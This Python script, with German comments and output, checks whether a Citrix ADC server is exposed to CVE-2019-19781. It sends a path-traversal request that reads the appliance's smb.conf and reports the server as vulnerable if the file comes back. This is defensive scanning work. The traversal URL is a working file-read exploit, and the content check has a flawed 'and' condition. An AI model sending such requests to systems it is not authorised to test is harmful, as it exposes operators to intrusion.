# !/usr/bin/env python3
# -----------------------------------------------------
# Check ob ein Server von Citrixlücke CVE-2019-19781 betroffen ist
# smartdynamic AG Januar 2020, Melih Bildik
#-----------------------------------------------------

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings
import argparse
from netaddr import IPNetwork
import threading
import time
import subprocess


# URL übermittlungsfunktion
# Verwendung von requests:
# https://requests.readthedocs.io/en/master/api/
def submit_url(url):
    with requests.Session() as s:
        r = requests.Request(method='GET', url=url)
       #Session aufbauen, get mit der URL
        prep = r.prepare()
        prep.url = url
        return s.send(prep, verify=False, timeout=2)

# our main function for testing the vulnerability
def check_server(target, targetport, verbose):
    try:
        print("Scanne nach der Citrix Lücke CVE-2019-19781 auf: %s        " % target)#, end="\r") # Cleaning up output a little
        # if for some ungodly reason they are using HTTP
        if targetport == "80":
            url = ("http://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (target,targetport))
            req = submit_url(url)

        # for all other requests use HTTPS
        else:
            url = ("https://%s:%s/vpn/js/%%2e./.%%2e/%%76pns/cfg/smb.conf" % (target,targetport))
            req = submit_url(url)

        # if the system is still vulnerable
        if ("[global]") and ("encrypt passwords") and("name resolve order") in str(req.content): # each smb.conf will contain a [global] variable
            print("[\033[91m!\033[0m] Dieser Citrix ADC Server: %s ist nicht gegen die Lücke CVE-2019-19781 geschützt." % (target))
            vulnServers.append(target)
            return 1

        # if the system responds with a Citrix message (fixed) or a 403 (fixed)
        elif ("Citrix") in str(req.content) or "403" in str(req.status_code): # only seen if system is not vulnerable
            print("[\033[92m*\033[0m] CITRIX Server gefunden, der Server %s ist sicher!" % (target))

        # if we run into something other than Citrix
        else:
            if verbose == True: print("[-] Server %s ist scheinbar kein Citrix Server." % (target))
            pass

    # handle exception errors due to timeouts
    except requests.ReadTimeout: 
        if verbose == True: print("[-] ReadTimeout: Server %s antwortet nicht auf den Port: %s." % (target, targetport))
        pass 

    except requests.ConnectTimeout:
        if verbose == True: print("[-] ConnectTimeout: Server %s antwortet nicht auf den Webrequest oder der Port (%s) ist nicht offen." % (target, targetport))
        pass 

    except requests.ConnectionError:
        if verbose == True: print("[-] ConnectionError: Server %s  antwortet nicht auf den Webrequest oder der Port (%s) ist nicht offen." % (target,targetport))
        pass

print('Scan gestartet')
print("-" * 45)

vulnServers = []
counter = 0

# parse our commands
parser = argparse.ArgumentParser()
parser.add_argument("target", help="the vulnerable server with Citrix (defaults https)")
parser.add_argument("targetport", help="the target server web port (normally on 443)")
parser.add_argument("verbose", nargs="?", help="print out verbose information")
args = parser.parse_args()

# if we specify a verbose flag
if args.verbose:
    verbose = True
else: verbose = False

try:
    counter = counter + 1 
    check_server(args.target, args.targetport,verbose)

    # do a report on vuln servers
    print("%s Server überprüft: Anzahl betroffene Server %s :" % (counter, len(vulnServers)))
    print("-" * 45)
    for server in vulnServers:
        print(server)

except KeyboardInterrupt:
    print("[!] interrupt received, stopping..")
    time.sleep(0.1)